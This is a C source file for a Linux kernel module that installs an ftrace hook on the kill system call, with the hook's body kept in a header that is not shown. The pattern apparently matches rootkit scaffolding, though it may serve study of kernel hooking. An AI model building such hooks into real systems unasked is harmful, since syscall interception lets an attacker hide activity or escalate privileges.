#include "headers.h"
#include "ftrace.h"
#include "hooks/kill.h"

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};


static int __init lkm_init(void) {

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "lkm: Good to go everything is working so far ... \n");

    return 0;
}

static void __exit lkm_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "lkm: BYE\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d3dsec");